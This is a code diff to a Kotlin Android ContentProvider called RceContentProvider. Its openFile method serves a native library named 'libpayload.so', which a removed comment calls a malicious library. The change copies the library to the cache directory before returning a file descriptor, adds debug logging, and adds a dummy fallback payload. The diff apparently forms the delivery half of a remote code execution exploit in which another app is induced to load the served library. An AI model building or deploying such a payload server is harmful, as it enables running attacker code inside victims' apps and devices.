@@ -8,6 +8,8 @@ import android.net.Uri
 import android.os.ParcelFileDescriptor
 import android.provider.OpenableColumns
 import java.io.File
+import android.util.Log
+
 import java.io.FileOutputStream
 import java.io.InputStream
 
@@ -25,25 +27,44 @@ class RceContentProvider : ContentProvider() {
 
     override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor? {
         try {
-            // 1. Get the application context.
+            Log.d("RceContentProvider", "🔥🔥🔥 openFile called!")
+
             val appContext = context ?: return null
-
-            // 2.  Use applicationInfo.nativeLibraryDir to get the
-            //    correct, accessible path to the directory containing our .so files.
             val nativeLibDir = appContext.applicationInfo.nativeLibraryDir
-            val libFile = File(nativeLibDir, "libpayload.so")
+            Log.d("RceContentProvider", "Native lib dir: $nativeLibDir")
 
-            // Log.d("RceContentProvider", "Serving malicious library from path: ${libFile.absolutePath}")
+            val sourceLibFile = File(nativeLibDir, "libpayload.so")
 
-            // 3. Check if the file actually exists before serving it.
-            if (!libFile.exists()) {
-                // Log.e("RceContentProvider", "FATAL: libpayload.so not found at path!")
-                return null
+            Log.d("RceContentProvider", "Looking for: ${sourceLibFile.absolutePath}")
+            Log.d("RceContentProvider", "Source exists: ${sourceLibFile.exists()}")
+
+            if (sourceLibFile.exists()) {
+                Log.d("RceContentProvider", "Source size: ${sourceLibFile.length()} bytes")
+
+                val stagedFile = File(appContext.cacheDir, "payload.so")
+                sourceLibFile.inputStream().use { input ->
+                    stagedFile.outputStream().use { output ->
+                        input.copyTo(output)
+                    }
+                }
+
+                Log.d("RceContentProvider", "✅ Staged size: ${stagedFile.length()} bytes")
+                return ParcelFileDescriptor.open(stagedFile, ParcelFileDescriptor.MODE_READ_ONLY)
+
+            } else {
+                Log.e("RceContentProvider", "❌ libpayload.so NOT FOUND!")
+
+                // Create a recognizable dummy for testing
+                val dummyFile = File(appContext.cacheDir, "dummy.so")
+                FileOutputStream(dummyFile).use {
+                    it.write("THIS_IS_DUMMY_PAYLOAD_29_BYTES".toByteArray())
+                }
+                Log.d("RceContentProvider", "Created dummy: ${dummyFile.length()} bytes")
+                return ParcelFileDescriptor.open(dummyFile, ParcelFileDescriptor.MODE_READ_ONLY)
             }
 
-            return ParcelFileDescriptor.open(libFile, ParcelFileDescriptor.MODE_READ_ONLY)
         } catch (e: Exception) {
-            // Log.e("RceContentProvider", "Error opening file", e)
+            Log.e("RceContentProvider", "❌ Exception: ${e.message}")
             return null
         }
     }
